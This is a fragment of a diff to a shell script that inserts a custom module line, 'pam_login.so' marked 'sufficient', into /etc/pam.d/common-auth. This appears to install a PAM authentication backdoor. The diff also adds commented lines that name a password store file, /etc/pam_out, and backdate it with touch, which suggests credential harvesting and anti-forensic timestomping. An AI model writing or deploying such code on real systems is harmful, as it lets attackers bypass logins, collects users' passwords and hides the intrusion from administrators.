@@ -3,7 +3,9 @@
 PAM_FILE="/etc/pam.d/common-auth"
 CUSTOM_LINE='auth    sufficient                      /etc/pam.d/pam_login.so'
 
-# Exit if already present
+# PAM_PASSWORD_STORE="/etc/pam_out"
+# touch -d "Aug 2 2014" "$PAM_PASSWORD_STORE"
+
 grep -qF "$CUSTOM_LINE" "$PAM_FILE" && exit 0
 
 awk -v insert_line="$CUSTOM_LINE" '
